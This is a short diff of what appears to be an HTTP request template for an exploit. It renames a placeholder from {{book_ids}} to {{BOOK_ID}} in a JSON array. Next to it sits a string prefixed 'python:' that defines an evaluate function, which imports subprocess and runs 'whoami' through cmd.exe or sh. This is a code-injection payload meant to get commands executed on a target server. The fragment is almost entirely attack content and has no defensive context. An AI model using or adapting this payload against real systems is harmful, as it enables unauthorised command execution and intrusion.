@@ -11,6 +11,6 @@ Accept-Encoding: gzip, deflate
     "",
     "",
     "",
-    {{book_ids}},
+    {{BOOK_ID}},
    "python:def evaluate(a, b):\n  import subprocess\n  try:\n    return subprocess.check_output(['cmd.exe', '/c', 'whoami'])\n  except Exception:\n    return subprocess.check_output(['sh', '-c', 'whoami'])\n"
 ]
